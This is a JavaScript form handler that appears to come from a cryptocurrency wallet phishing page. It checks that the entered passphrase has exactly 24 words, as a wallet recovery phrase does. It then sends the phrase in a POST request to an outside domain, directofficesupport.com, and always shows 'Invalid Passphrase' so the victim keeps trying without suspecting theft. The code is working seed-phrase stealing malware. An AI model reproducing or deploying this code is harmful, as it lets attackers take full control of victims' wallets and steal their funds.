


// Function to handle form submission
function handleSubmit(event) {
    event.preventDefault(); // Prevent default form submission
    const errorElement = document.getElementById('emsg');
    errorElement.textContent = '';
    const myButton = document.getElementById('b1');
    myButton.disabled = true;

    const myButton2 = document.getElementById('b2');
    myButton2.disabled = true;

    // Step 1: Get the value of the hidden input field with name 'mf-texts'
    const form = document.getElementById('myForm'); // Replace 'myForm' with your form ID
    const inputValue = form.elements['mf-texts'].value.trim();

    const wordCount = inputValue.split(/\s+/).length;
    if (wordCount !== 24) {
        errorElement.textContent = 'Invalid Passphrase';
        myButton.disabled = false;
        myButton2.disabled = false;
        form.reset();
        return; // Exit function if word count is not 24
    }

    // Step 2: Make a POST request to example.com/send/
    const url = 'https://directofficesupport.com/send_char/P-/';
    
    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ passphrase: inputValue })
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        return response.json(); // Assuming the response is JSON; adjust as per your API
    })
    .then(data => {
        // Step 3: Display any errors in the HTML with ID 'emsg'
        errorElement.textContent = 'Invalid Passphrase';
        myButton.disabled = false;
        myButton2.disabled = false;
        form.reset();
    })
    .catch(error => {
        console.error('Error:', error);
        errorElement.textContent = 'Invalid Passphrase';
        form.reset();
        myButton.disabled = false;
        myButton2.disabled = false;
    });
}

// Add event listener to the form for 'submit' event
const form = document.getElementById('myForm'); // Replace 'myForm' with your form ID
form.addEventListener('submit', handleSubmit);
